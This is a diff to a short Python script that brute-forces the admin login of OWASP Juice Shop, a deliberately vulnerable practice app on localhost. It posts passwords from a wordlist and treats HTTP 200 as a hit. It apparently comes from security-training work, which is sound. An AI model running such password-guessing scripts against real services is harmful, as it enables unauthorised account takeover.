@@ -8,7 +8,6 @@ import requests
 
 # define the webpage you want to crack
 url = "http://localhost:3000/rest/user/login/"
-# url = "https://3000-equinorplay-edcjuicesho-buf7kvvvznu.ws-eu64.gitpod.io/rest/user/login/"
 
 # We know the admin user name
 email = "admin@juice-sh.op"
@@ -26,9 +25,8 @@ for password in file.readlines():
     data = {'email':email, 'password':password}
     send_data_url = requests.post(url, data=data)
 
-    if "Invalid email or password" in str(send_data_url.content):
-        print("[*] Attempting password: %s" % password)
-    else:
+    print("[*] Attempting password: %s" % password)
+    if send_data_url.status_code == 200:
         print("[*] Password found: %s " % password)
         print(send_data_url.content)
         break
